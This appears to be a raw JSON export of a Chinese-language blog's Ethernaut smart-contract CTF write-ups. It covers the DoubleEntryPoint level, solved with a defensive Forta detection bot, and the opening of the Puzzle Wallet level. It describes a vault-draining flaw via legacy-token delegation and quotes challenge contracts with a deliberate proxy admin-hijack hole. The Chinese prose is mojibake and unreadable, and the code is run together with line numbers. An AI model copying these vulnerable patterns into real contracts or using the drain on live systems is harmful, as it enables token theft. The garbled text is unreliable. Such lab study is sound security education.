forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940## 2. åˆ†æ- è¿™ä¸ªæŒ‘æˆ˜ä¼¼ä¹æ˜¯ OpenZeppelin å’Œ Forta ä¹‹é—´çš„åˆèµ„ä¼ä¸šï¼Œä¸€ä¸ªå®æ—¶å®‰å…¨å’Œæ“ä½œç›‘æ§ã€‚æ®æˆ‘æ‰€çŸ¥ï¼Œè¯•å›¾å‘æ‚¨è§£é‡Šæ‚¨åº”è¯¥å¦‚ä½•é›†æˆ Forta ç³»ç»Ÿæ¥ç›‘æ§æ‚¨çš„åˆåŒæ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¿›å±•å¦‚ä½•ã€‚ ä»æŒ‘æˆ˜çš„æè¿°ï¼ˆè¯´å®è¯ä¸æ¸…æ¥šï¼‰æˆ‘ä»¬æœ‰ä¸¤ä¸ªä»¤ç‰Œï¼š`LegacyToken`é¡¾åæ€ä¹‰æ˜¯ä¸€ä¸ªå·²â€œå¼ƒç”¨â€çš„ä»¤ç‰Œï¼ˆè¿™åœ¨ç°å®ç”Ÿæ´»ä¸­å‘ç”Ÿè¿‡å—ï¼Ÿï¼‰æ”¯æŒä¸€ä¸ªåä¸º`DoubleEntryPoint`. æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªç§°ä¸º Vault çš„åº“`CryptoVault`ï¼Œå®ƒå…·æœ‰ä¸€äº›åŠŸèƒ½ï¼ˆä¸æŒ‘æˆ˜èŒƒå›´æ— å…³ï¼‰ï¼Œå¹¶æä¾›ä¸€ç§ç§°ä¸ºå®ç”¨ç¨‹åºçš„æ–¹æ³•ï¼Œå…è®¸`sweepToken(IERC20 token)`ä»»ä½•äººâ€œæ‰«æâ€ï¼ˆè½¬ç§»ï¼‰åˆ°`sweptTokensRecipient`ï¼ˆéƒ¨ç½²æ—¶å®šä¹‰çš„åœ°å€ï¼‰å·²å‘é€çš„ä»¤ç‰Œä¸å°å¿ƒå»äº†é‡‘åº“ã€‚è¯¥å‡½æ•°ä¸­å”¯ä¸€çš„æ£€æŸ¥æ˜¯æ‚¨ä¸èƒ½æ‰«é™¤`underlying`Vault çš„ä»¤ç‰Œã€‚ åœ¨éƒ¨ç½²æ—¶ï¼Œæˆ‘ä»¬ä»è¿™ä¸ªé…ç½®å¼€å§‹ï¼š - `CryptoVault`æŒæœ‰**100 ä¸ª DET** ( `DoubleEntryToken`) - `CryptoVault`æŒæœ‰**100 LGT** ( `LegacyToken`) æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ª**Forta DetectionBot**æ¥ç›‘æ§åˆçº¦å¹¶é˜²æ­¢å¤–éƒ¨æ”»å‡»è€…è€—å°½æœ¬`CryptoVault`ä¸åº”è€—å°½çš„ä»£å¸ã€‚ è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æ¯ä¸ªåˆåŒï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½æ‰¾åˆ°ä¸€äº›æ”»å‡»åª’ä»‹ã€‚ ### `LegacyToken.sol` ```solidity contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; å®ƒæ˜¯ä¸€ä¸ª`ERC20`ç»§æ‰¿è‡ªçš„ä»¤ç‰Œ`Ownable`ã€‚åˆçº¦`owner`çš„ å¯ä»¥é€šè¿‡è°ƒç”¨`mint`æ–°ä»£å¸å’Œæ›´æ–°å˜é‡çš„å€¼ã€‚`delegate``delegateToNewContract` å¥‡æ€ªçš„éƒ¨åˆ†æ˜¯åœ¨`transfer`è¦†ç›–äº†æ ‡å‡†æä¾›çš„é»˜è®¤å‡½æ•°çš„å‡½æ•°ä¸­`ERC20`ã€‚ å¦‚æœæ²¡æœ‰å®šä¹‰å§”æ‰˜ï¼ˆ`address(delegate) == address(0)`ï¼‰ï¼Œåˆ™åˆçº¦ä½¿ç”¨æ ‡å‡†çš„é»˜è®¤é€»è¾‘`ERC20`ï¼›å¦åˆ™æ‰§è¡Œ`return delegate.delegateTransfer(to, value, msg.sender)`ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ`delegate`æ˜¯`DoubleEntryPoint`åˆåŒæœ¬èº«ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿå½“æ‚¨åœ¨ç°å®ä¸­æ‰§è¡Œè½¬ç§»æ—¶ï¼Œ`LegacyToken`å®ƒæ­£åœ¨è½¬å‘è¦æ‰§è¡Œçš„æ“ä½œ`DoubleEntryPoint.delegateTransfer`ã€‚è®©æˆ‘ä»¬åˆ‡æ¢åˆ°å¦ä¸€ä¸ªä»¤ç‰Œä»£ç ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ ### `DoubleEntryPoint.sol` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor( address legacyToken, address vaultAddress, address fortaAddress, address playerAddress ) public &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; åˆçº¦æ˜¯`ERC20`ç»§æ‰¿è‡ª å’Œ çš„`DelegateERC20`æ™®é€šä»£å¸`Ownable`ã€‚`DelegateERC20`æ˜¯å¼ºåˆ¶åˆçº¦å®ç°token`function delegateTransfer(address to, uint256 value, address origSender)`éœ€è¦çš„åŠŸèƒ½çš„æ¥å£`LegacyToken`ã€‚ æœ‰æ—¶`constructor`ï¼Œè®¾ç½®ä¸€äº›çŠ¶æ€å˜é‡å¹¶å°†`100`ä»¤ç‰Œé“¸é€ åˆ°`CryptoVault`. åœ¨è¿›å…¥`delegateTransfer`å‡½æ•°ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹`fortaNotify`å‡½æ•°ä¿®é¥°ç¬¦ 123456789101112131415modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);&#125; è¿™ä¸ªä¿®æ”¹å™¨çš„ä½œç”¨æ˜¯è§¦å‘ Forta æ£€æµ‹ç³»ç»Ÿå®ç°çš„ä¸€äº›é€»è¾‘ã€‚**å®ƒåœ¨æœ¬åœ°å­˜å‚¨æ‰§è¡Œä»£ç å‡½æ•°ä¹‹å‰**å¼•å‘çš„è­¦æŠ¥æ•°é‡ï¼Œå¹¶å°†è¯¥æ•°å­—ä¸æ‰§è¡Œè°ƒç”¨å‡½æ•°ä¿®é¥°ç¬¦çš„å‡½æ•°ä¸»ä½“**ä¹‹å**å¼•å‘çš„è­¦æŠ¥æ•°é‡è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœè­¦æŠ¥æ•°é‡å¢åŠ ï¼Œäº¤æ˜“å°†**æ¢å¤**å¹¶æ˜¾ç¤ºæ¶ˆæ¯`&quot;Alert has been triggered, reverting&quot;`ã€‚ è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹è°ƒç”¨`LegacyToken`â€œé—ç•™â€æ—¶ä»¤ç‰Œä¹Ÿä½¿ç”¨çš„é‡è¦åŠŸèƒ½ã€‚`LegacyToken.transfer` 12345678function delegateTransfer( address to, uint256 value, address origSender) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true;&#125; å¦‚æœæŸ¥çœ‹å‡½æ•°ä¿®é¥°ç¬¦åˆ—è¡¨ï¼Œæ‚¨ä¼šçœ‹åˆ° - `onlyDelegateFrom`åªå…è®¸`delegateFrom`è°ƒç”¨æ­¤å‡½æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåª`LegacyToken`å…è®¸åˆçº¦è°ƒç”¨æ­¤å‡½æ•°ï¼Œå¦åˆ™å°†å…è®¸ä»»ä½•äººè°ƒç”¨`_transfer`ï¼ˆå³ä½çº§ ERC20 ä¼ è¾“ï¼‰æ¥è‡ª`origSender` - `fortaNotify`æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŠŸèƒ½ä¿®é¥°ç¬¦ï¼Œå¯ä»¥è§¦å‘ä¸€äº›ç‰¹å®šçš„ Forta é€»è¾‘ï¼Œå°±åƒæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„é‚£æ · å‡½æ•°æœ¬èº«å¾ˆç®€å•ï¼Œå°±æ˜¯è°ƒç”¨å‡½æ•°çš„ERC20å†…éƒ¨å®ç°`_transfer`ã€‚è¯·è®°ä½ï¼Œ`_transfer`åªæ£€æŸ¥ that`to`å’Œ`origSender`are not`address(0)`ä»¥åŠ`origSender`æœ‰è¶³å¤Ÿçš„ä»¤ç‰Œå¯ä»¥è½¬ç§»åˆ°`to`ï¼ˆå®ƒè¿˜æ£€æŸ¥ä¸è¶³/æº¢å‡ºæ¡ä»¶ï¼‰ä½†å®ƒä¸æ£€æŸ¥ that `origSender`is`msg.sender`æˆ–æ¶ˆè´¹è€…æ˜¯å¦æœ‰è¶³å¤Ÿçš„æ´¥è´´ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æœ‰ä¿®é¥°ç¬¦`onlyDelegateFrom`ã€‚ ### `CryptoVault.sol` 12345678910111213141516171819202122contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) public &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125; åˆçº¦åº”å®ç°æ™®é€šåŠ å¯† Vault ç³»ç»Ÿçš„é€»è¾‘ã€‚å¯¹äºæŒ‘æˆ˜çš„èŒƒå›´è€Œè¨€ï¼Œè¿™éƒ¨åˆ†é€»è¾‘å¹¶ä¸æœ‰è¶£ã€‚ ç”±äºä»»ä½•é‡‘åº“ä¹Ÿ`CryptoVault`æœ‰ä¸€ä¸ªåŸºç¡€ä»¤ç‰Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯`DoubleEntryPoint`. ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨çš„å‡½æ•°`sweepToken`å…è®¸é‡‘åº“å°†ä»»æ„`token`ï¼ˆæŒ‡å®šä¸ºè¾“å…¥å‚æ•°ï¼‰çš„æ•´ä¸ªé‡‘åº“ä½™é¢è½¬ç§»åˆ°`sweptTokensRecipient`. æ”¶ä»¶äººåº”è¯¥æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºå®ƒæ˜¯ç”±åˆåŒçš„éƒ¨ç½²è€…åŠæ—¶åˆå§‹åŒ–çš„`constructor`ã€‚ ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå”¯ä¸€å®Œæˆçš„æ£€æŸ¥æ˜¯é˜²æ­¢ Vault è½¬ç§»ä»¤ç‰Œ`underlying`ã€‚ ### é€šè¿‡éƒ¨ç½² Forta DetectionBot æ‰¾åˆ°æ¼æ´å¹¶é˜»æ­¢å®ƒ é€šè¿‡ç»“åˆæˆ‘ä»¬æ”¶é›†åˆ°çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‚¨æ˜¯å¦å‘ç°äº†æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Ÿå›é¡¾ä¸€ä¸‹æˆ‘ä»¬ç°æœ‰çš„çŸ¥è¯†ï¼š - `CryptoVault`çš„`underlying`ä»¤ç‰Œæ˜¯`DoubleEntryPoint`ã€‚è¯¥åˆçº¦æä¾›äº†ä¸€ä¸ª`sweepToken`åœ¨ Vault ä¸­è½¬ç§»ä»£å¸çš„æ–¹æ³•ï¼Œä½†å®ƒé˜»æ­¢äº†æ¸…é™¤`DoubleEntryPoint`ä»£å¸ï¼ˆå› ä¸ºå®ƒæ˜¯`underlying`ï¼‰ - `DoubleEntryPoint`token æ˜¯ä¸€ä¸ª ERC20 ä»¤ç‰Œï¼Œå®ƒå®ç°äº†ä¸€ä¸ª`delegateTransfer`åªèƒ½ç”±`LegacyToken`ä»¤ç‰Œè°ƒç”¨çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶ä¸”ç”± Forta é€šè¿‡æ‰§è¡Œå‡½æ•°ä¿®é¥°ç¬¦æ¥ç›‘æ§`fortaNotify`ã€‚è¯¥å‡½æ•°å…è®¸å§”æ‰˜äººå°†ä¸€å®šæ•°é‡çš„ä»£å¸ä»`origSpender`ä»»æ„æ¥æ”¶è€…è½¬ç§» - `LegacyToken`æ˜¯å·²â€œå¼ƒç”¨â€çš„ ERC20 ä»¤ç‰Œã€‚å½“`transfer(address to, uint256 value)`å‡½æ•°è¢«è°ƒç”¨æ—¶`DoubleEntryPoint`ï¼Œï¼ˆä»¤ç‰Œçš„â€œæ–°ç‰ˆæœ¬â€ï¼‰`delegate.delegateTransfer(to, value, msg.sender)`è¢«è°ƒç”¨ é—®é¢˜åœ¨å“ªé‡Œï¼Ÿå› ä¸º`LegacyToken.transfer`æ˜¯â€œé•œåƒâ€ï¼Œ`DoubleEntryPoint.transfer`è¿™æ„å‘³ç€å½“æ‚¨è¦æ±‚å°è¯•è½¬ç§» 1 ä¸ªæ—¶ï¼Œ`LegacyToken`å®é™…ä¸Šæ‚¨è½¬ç§»çš„æ˜¯ 1 ä¸ª`DoubleEntryPoint`ä»£å¸ï¼ˆä¸ºäº†èƒ½å¤Ÿåšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‚¨çš„ä½™é¢ä¸­å¿…é¡»åŒæ—¶æ‹¥æœ‰è¿™ä¸¤ä¸ªä»£å¸ï¼‰ åŒ…å«`CryptoVault`ä¸¤ä¸ªä»¤ç‰Œä¸­çš„ 100 ä¸ªï¼Œä½†`sweepToken`ä»…é˜»æ­¢`underlying` `DoubleEntryPoint`. ä½†æ˜¯é€šè¿‡äº†è§£å…¶å·¥ä½œåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨`LegacyToken`è½»æ¾æ‰«é™¤æ‰€æœ‰ä»¤ç‰Œã€‚`DoubleEntryPoint``CryptoVault.sweep(address(legacyTokenContract))` ç°åœ¨æˆ‘ä»¬çŸ¥é“å¦‚ä½•åˆ©ç”¨å®ƒï¼Œæˆ‘ä»¬å¦‚ä½•åˆ©ç”¨ Forta é›†æˆæ¥**é˜²æ­¢**åˆ©ç”¨å¹¶æ¢å¤äº¤æ˜“ï¼Ÿæˆ‘ä»¬å¯ä»¥æ„å»ºä¸€ä¸ªæ‰©å±• Forta çš„åˆçº¦`IDetectionBot`å¹¶å°†å…¶æ’å…¥`DoubleEntryPoint`. é€šè¿‡è¿™æ ·åšï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåœ¨ Vault`sweepToken`è§¦å‘`LegacyToken.transfer`å°†è§¦å‘`DoubleEntryPoint.delegateTransfer`å°†è§¦å‘ï¼ˆåœ¨æ‰§è¡Œå‡½æ•°ä»£ç ä¹‹å‰ï¼‰å‡½æ•°`fortaNotify`ä¿®é¥°ç¬¦æ—¶é˜²æ­¢åˆ©ç”¨ã€‚æ˜¯çš„ï¼Œæˆ‘çŸ¥é“æ‰§è¡Œé“¾å¾ˆæ·±ï¼Œä½†è¯·è€å¿ƒç­‰å¾…ï¼Œæˆ‘ä»¬æ˜ç™½äº†ï¼ åˆçº¦`IDetectionBot`æ¥å£åªæœ‰ä¸€ä¸ªå‡½æ•°ç­¾å`function handleTransaction(address user, bytes calldata msgData) external;`ï¼Œå¯ä»¥é€šè¿‡`DoubleEntryPoint.delegateTransfer`è¿™äº›å‚æ•°ç›´æ¥è°ƒç”¨`forta.notify(player, msg.data)`ã€‚ åªæœ‰åœ¨è¿™ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ºçœŸæ—¶ï¼Œæˆ‘ä»¬æ‰ä¼šåœ¨å†…éƒ¨`DetectionBot`å‘å‡ºè­¦æŠ¥ï¼š - åŸå§‹å‘ä»¶äººï¼ˆæ­£åœ¨å‘¼å«çš„äºº`DoubleEntryPoint.delegateTransfer`ï¼‰æ˜¯`CryptoVault` - è°ƒç”¨å‡½æ•°çš„ç­¾åï¼ˆçš„å‰ 4 ä¸ªå­—èŠ‚`calldata`ï¼‰ç­‰äº`delegateTransfer`ç­¾å è®©æˆ‘ä»¬`origSender`ä»ä¸­æå–å€¼`msgData`ï¼ˆè¯·è®°ä½ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œè¯¥å‚æ•°å€¼ç­‰äº`msg.data`ï¼‰ã€‚å¦‚æœæ‚¨æŸ¥çœ‹â€œç‰¹æ®Šå˜é‡å’Œå‡½æ•°â€éƒ¨åˆ†ä¸‹çš„[å—å’Œäº¤æ˜“å±æ€§](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)`msg.data`çš„ Solidity æ–‡æ¡£ï¼Œæ‚¨ä¼šçœ‹åˆ°è¿™æ˜¯ä¸€ç§ä»£è¡¨**å®Œæ•´ calldata çš„**`bytes calldata`æ•°æ®ç±»å‹ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿåœ¨è¿™äº›å­—èŠ‚ä¸­ï¼Œæ‚¨å°†åŒæ—¶æ‹¥æœ‰å‡½æ•°é€‰æ‹©å™¨ï¼ˆ4 ä¸ªå­—èŠ‚ï¼‰å’Œå‡½æ•°æœ‰æ•ˆè´Ÿè½½ã€‚ è¦æå–å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä½¿ç”¨`abi.decode`è¿™æ ·çš„`(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));`ã€‚ä¸€ä¸ªé‡è¦çš„æ³¨æ„äº‹é¡¹ï¼šæˆ‘ä»¬å‡è®¾åœ¨è¿™äº›å­—èŠ‚ä¸­ï¼Œè¿™äº›ç‰¹å®šç±»å‹çš„ä¸‰ä¸ªå€¼ä»¥è¿™äº›ç‰¹å®šé¡ºåºæ’åˆ—ã€‚æˆ‘ä»¬æ­£åœ¨åšä¸€ä¸ªéå¸¸**è‰°éš¾çš„å‡è®¾**ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦å°†æ­¤ä¿¡æ¯ä¸å‡½æ•°ç­¾åä¸å¼ºåˆ¶æ‰§è¡Œè¿™äº›ç±»å‹å’Œé¡ºåºè¦æ±‚çš„å‡½æ•°ç­¾åç›¸åŒ¹é…è¿™ä¸€äº‹å®ç»“åˆèµ·æ¥`delegateTransfer`ã€‚ 1msgData`ç¬¬äºŒéƒ¨åˆ†éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€é€šè¿‡åˆå¹¶å‰ 4 ä¸ªå­—èŠ‚æ¥é‡å»ºè°ƒç”¨ç­¾åï¼Œ`bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);`å¹¶å°†å…¶ä¸æˆ‘ä»¬çŸ¥é“çš„æ­£ç¡®ç­¾åè¿›è¡Œæ¯”è¾ƒ`delegateTransfer`â†’`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ## è§£å†³æ–¹æ¡ˆä»£ç  è®©æˆ‘ä»¬çœ‹çœ‹æ£€æµ‹çš„æ•´ä¸ªä»£ç `DetectionBot` 12345678910111213141516171819contract DetectionBot is IDetectionBot &#123; address private monitoredSource; bytes private monitoredSig; constructor(address _monitoredSource, bytes memory _monitoredSig) public &#123; monitoredSource = _monitoredSource; monitoredSig = _monitoredSig; &#125; function handleTransaction(address user, bytes calldata msgData) external override &#123; (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address)); bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]); if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123; IForta(msg.sender).raiseAlert(user); &#125; &#125;&#125; åœ¨æ„é€ å‡½æ•°å†…éƒ¨ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°†æ˜¯æˆ‘ä»¬è¦ç›‘è§†çš„æºï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯åœ°å€ï¼Œ`CryptoVault`ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬æ‰“ç®—ç›‘è§†çš„å‡½æ•°çš„ç­¾åï¼Œåœ¨æœ¬ä¾‹ä¸­æ˜¯`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)`ã€‚ ç°åœ¨æˆ‘ä»¬åªéœ€è¦éƒ¨ç½²ä¼ é€’æ­£ç¡®å‚æ•°çš„æœºå™¨äººå¹¶å°†æœºå™¨äººæ’å…¥ Forta ç³»ç»Ÿå¹¶è§£å†³æŒ‘æˆ˜ã€‚æˆ‘ä»¬èµ°å§ï¼ 12345678910111213141516function exploitLevel() internal override &#123; vm.startPrank(player, player); // Create and deploy the `DetectionBot` with the correct constructor paramter // The first one is the source we want to monitor // The second one is the signature of the function we want to match DetectionBot bot = new DetectionBot( level.cryptoVault(), abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ); // add the bot to the Forta network detection system that monitor the `DoubleEntryPoint` contract level.forta().setDetectionBot(address(bot)); vm.stopPrank();&#125; 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Puzzle Wallet","slug":"Smart contracts/ethernaut/Puzzle Wallet","date":"2023-03-12T04:10:10.000Z","updated":"2023-03-12T04:10:10.000Z","comments":true,"path":"2023/03/12/Smart contracts/ethernaut/Puzzle Wallet/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/12/Smart%20contracts/ethernaut/Puzzle%20Wallet/","excerpt":"","text":"Puzzle Walletï¼ˆä¸ä¼šï¼‰1. é¢˜ç›®è¦æ±‚ 1.1 Nowadays, paying for DeFi operations is impossible, fact. A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this. They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners. Little did they know, their lunch money was at riskâ€¦ Youâ€™ll need to hijack this wallet to become the admin of the proxy. Things that might help:: Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one. Knowing about proxy patterns and the way they handle storage variables. 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; pragma experimental ABIEncoderV2; import &quot;../helpers/UpgradeableProxy-08.sol&quot;; contract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125; &#125; contract PuzzleWallet &#123; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] -= value; (bool success, ) = to.call&#123; value: value &#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768## 2. åˆ†æ#### tips: [å‚è€ƒåšå®¢](https://stermi.xyz/blog/ethernaut-challenge-23-solution-puzzle-wallet)å¦‚æœæ‚¨æ˜¯ä»£ç†ä¸–ç•Œçš„æ–°æ‰‹ï¼Œæˆ‘å¼ºçƒˆå»ºè®®æ‚¨å…ˆé˜…è¯»æ‰€æœ‰è¿™äº›å†…å®¹ï¼š- [OpenZeppelin ä»£ç†](https://docs.openzeppelin.com/contracts/4.x/api/proxy)- [OpenZeppelin ä»£ç†å‡çº§æ¨¡å¼](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)- [OpenZeppelin Transparent ä¸ UUPS ä»£ç†](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)- [ï¼ˆè§†é¢‘ï¼‰OpenZeppelin éƒ¨ç½²æ›´é«˜æ•ˆçš„å¯å‡çº§åˆçº¦](https://www.youtube.com/watch?v=kWUDTZhxKZI)- [ï¼ˆè§†é¢‘ï¼‰OpenZeppelin # æ™ºèƒ½åˆçº¦å‡çº§çš„å®‰å…¨æ€§](https://www.youtube.com/watch?v=5WE6PEc305w&amp;t=3945s)**âš ï¸ é‡è¦ âš ï¸**è¿™åªæ˜¯å…³äºä»£ç†å¦‚ä½•å·¥ä½œçš„åŸºæœ¬è§£é‡Šï¼Œå¦‚æœæ‚¨éœ€è¦ä½¿ç”¨å®ƒä»¬æˆ–åœ¨ç°å®ç”Ÿæ´»åœºæ™¯ä¸­å®æ–½ï¼Œè¯·è‡ªè¡Œç ”ç©¶ã€‚æˆ‘ä¼šå°è¯•åœ¨ä¸€ä¸ªéå¸¸é«˜çš„å±‚æ¬¡ä¸Šè§£é‡Šå®ƒï¼Œæ‰€ä»¥è¯·è€å¿ƒç­‰å¾…ã€‚ä»£ç†/å®ç°æ¨¡å¼èƒŒåçš„æƒ³æ³•æ˜¯æœ‰ä¸¤ä¸ªä¸åŒçš„åˆçº¦ï¼Œå®ƒä»¬çš„è¡Œä¸ºå¦‚ä¸‹ï¼š- ç”¨æˆ·ä¸ Proxy 